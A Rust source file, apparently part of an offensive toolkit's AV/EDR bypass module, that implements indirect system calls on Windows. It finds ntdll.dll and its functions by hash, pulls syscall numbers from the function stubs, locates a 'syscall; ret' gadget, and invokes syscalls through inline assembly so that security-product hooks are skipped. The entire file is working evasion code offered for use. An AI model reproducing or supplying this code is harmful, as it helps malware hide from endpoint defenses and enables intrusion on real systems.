use std::arch::asm;
use crate::av_edr_bypass::{AvEdrBypass, AvEdrBypassError};

pub struct IndirectSyscall;

impl IndirectSyscall {
    /// Dynamically finds a syscall number and a syscall instruction address in ntdll.dll
    /// to perform an indirect syscall, bypassing EDR hooks.
    #[cfg(target_os = "windows")]
    pub unsafe fn execute(hash: u32, args_count: u32, args: *const usize) -> Result<usize, AvEdrBypassError> {
        let ntdll_hash = AvEdrBypass::djb2_hash("ntdll.dll");
        let ntdll_base = AvEdrBypass::get_module_base_by_hash(ntdll_hash)
            .ok_or_else(|| AvEdrBypassError::MemoryOp("ntdll.dll not loaded".into()))?;

        let func_addr = AvEdrBypass::get_proc_address_by_hash(ntdll_base, hash)
            .ok_or_else(|| AvEdrBypassError::MemoryOp("Syscall function not found".into()))?;

        // Extract syscall number from the stub
        // Typically: mov eax, SYSCALL_NUMBER
        let syscall_number = *(func_addr.wrapping_add(4) as *const u32);

        // Find a 'syscall; ret' gadget in ntdll to use as an indirect jump
        // This makes the syscall appear to come from ntdll memory.
        let syscall_inst_addr = Self::find_syscall_gadget(ntdll_base)
            .ok_or_else(|| AvEdrBypassError::MemoryOp("Syscall gadget not found".into()))?;

        let result: usize;

        // Perform the syscall using inline assembly (x64)
        match args_count {
            0 => {
                asm!(
                    "mov r10, rcx",
                    "call r11",
                    in("eax") syscall_number,
                    in("r11") syscall_inst_addr,
                    out("rax") result,
                );
            }
            1 => {
                let arg0 = *args.offset(0);
                asm!(
                    "mov r10, rcx",
                    "call r11",
                    in("eax") syscall_number,
                    in("rcx") arg0,
                    in("r11") syscall_inst_addr,
                    out("rax") result,
                );
            }
            2 => {
                let arg0 = *args.offset(0);
                let arg1 = *args.offset(1);
                asm!(
                    "mov r10, rcx",
                    "call r11",
                    in("eax") syscall_number,
                    in("rcx") arg0,
                    in("rdx") arg1,
                    in("r11") syscall_inst_addr,
                    out("rax") result,
                );
            }
            3 => {
                let arg0 = *args.offset(0);
                let arg1 = *args.offset(1);
                let arg2 = *args.offset(2);
                asm!(
                    "mov r10, rcx",
                    "call r11",
                    in("eax") syscall_number,
                    in("rcx") arg0,
                    in("rdx") arg1,
                    in("r8") arg2,
                    in("r11") syscall_inst_addr,
                    out("rax") result,
                );
            }
            4 => {
                let arg0 = *args.offset(0);
                let arg1 = *args.offset(1);
                let arg2 = *args.offset(2);
                let arg3 = *args.offset(3);
                asm!(
                    "mov r10, rcx",
                    "call r11",
                    in("eax") syscall_number,
                    in("rcx") arg0,
                    in("rdx") arg1,
                    in("r8") arg2,
                    in("r9") arg3,
                    in("r11") syscall_inst_addr,
                    out("rax") result,
                );
            }
            // Add more cases as needed for more arguments (requires stack manipulation)
            _ => return Err(AvEdrBypassError::Syscall("Unsupported argument count".into())),
        }

        Ok(result)
    }

    #[cfg(target_os = "windows")]
    fn find_syscall_gadget(module_base: usize) -> Option<usize> {
        use windows::Win32::System::Diagnostics::Debug::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64};
        
        unsafe {
            let dos_header = &*(module_base as *const IMAGE_DOS_HEADER);
            let nt_header = &*((module_base + dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
            let text_section = (module_base + dos_header.e_lfanew as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const u8;
            
            // Simplified: scan the first section for 'syscall; ret' bytes (0x0F, 0x05, 0xC3)
            let search_limit = 0x100000; // Search up to 1MB
            let ptr = module_base as *const u8;
            for i in 0..search_limit {
                if *ptr.add(i) == 0x0F && *ptr.add(i+1) == 0x05 && *ptr.add(i+2) == 0xC3 {
                    return Some(ptr.add(i) as usize);
                }
            }
        }
        None
    }

    #[cfg(not(target_os = "windows"))]
    pub unsafe fn execute(_hash: u32, _args_count: u32, _args: *const usize) -> Result<usize, AvEdrBypassError> {
        Err(AvEdrBypassError::UnsupportedPlatform)
    }
}
